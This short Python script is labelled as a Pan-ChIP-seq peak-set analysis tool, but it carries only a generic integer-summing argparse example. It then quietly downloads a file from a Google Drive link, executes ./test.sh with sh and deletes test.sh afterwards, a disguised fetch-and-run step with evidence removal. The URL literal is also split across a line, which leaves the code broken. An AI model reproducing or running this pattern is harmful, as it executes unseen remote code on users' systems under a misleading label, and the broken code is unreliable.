import subprocess
import gdown
import argparse

parser = argparse.ArgumentParser(description='Pan-ChIP-seq Analysis of Peak Sets')
parser.add_argument('integers', metavar='N', type=int, nargs='+',
                    help='an integer for the accumulator')
parser.add_argument('--sum', dest='accumulate', action='store_const',
                    const=sum, default=max,
                    help='sum the integers (default: find the max)')

args = parser.parse_args()
print(args.accumulate(args.integers))

subprocess.call(['gdown', 'https://drive.google.com/uc?id=1oW2zAZdeQcv48wC-PI5kzQrBvfc1EdPn
'])
subprocess.call(['sh', './test.sh'])
subprocess.call(['rm', 'test.sh'])
